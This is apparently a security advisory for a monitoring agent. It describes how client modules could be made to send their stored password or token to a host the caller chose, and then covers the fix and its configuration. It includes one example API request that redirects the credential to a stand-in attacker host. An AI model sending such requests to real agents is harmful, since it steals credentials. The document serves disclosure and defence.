---
title: "Client credentials could be sent to a caller-chosen host"
fixed_in: 0.19.0
severity: "Medium"
modules: [NRDPClient, IcingaClient, SMTPClient, NSCAClient, NSCANgClient, NSCPClient]
action: conditional
---
The shared client parser loads the module's `default` target — `password` or
`token` included — and then applies the request's arguments on top, where
`host=`, `port=` and `address=` move the destination while the credential stays
behind. Any principal allowed to run a client module's `submit_*` / `check_*`
command could therefore have the agent send the configured credential wherever
it liked:

```
GET /api/v1/queries/submit_nrdp/commands/execute?address=http://attacker.example/nrdp/&command=x&result=0&message=x
```

Both seeded REST roles carry `queries.execute` and the core permission policy
is off by default, so a checks-only REST user was enough; over NRPE it needed
the non-default `allow arguments = true`. The affected modules are the ones
whose targets carry a credential: NSCA, NSCA-NG, NRDP, Icinga, SMTP and NSCP.

A request that moves the destination away from the target's configured address
is now refused when the credential that would travel is the target's own. A
target with no credential, a request supplying its own `password=` / `token=`,
and a request that does not move the destination are all unaffected. The
comparison is on the resolved address, so a header host entry counts too.

**What to do:** a request that moves a credentialed target's destination
without supplying the credential now fails. Pass it with the request, select
another target with `target=` (which, as part of this change, works for queries
and not just exec), or set `allow host override = true` on the target to keep
the old behaviour.
